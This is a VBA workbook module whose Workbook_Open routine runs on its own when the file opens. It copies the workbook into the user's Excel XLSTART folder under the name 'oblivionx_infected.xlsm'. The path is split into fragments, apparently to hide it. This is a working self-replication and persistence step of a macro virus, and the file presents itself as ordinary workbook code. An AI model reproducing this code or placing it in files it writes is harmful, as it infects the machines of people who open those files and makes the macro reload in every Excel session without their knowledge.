Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim dst As String
    dst = Environ("APPDATA") & "\Micro" & "soft\Exce" & "l\XL" & "START" & "\obliv" & "ionx" & "_infect" & "ed.xl" & "sm"
    ThisWorkbook.SaveCopyAs dst
End Sub
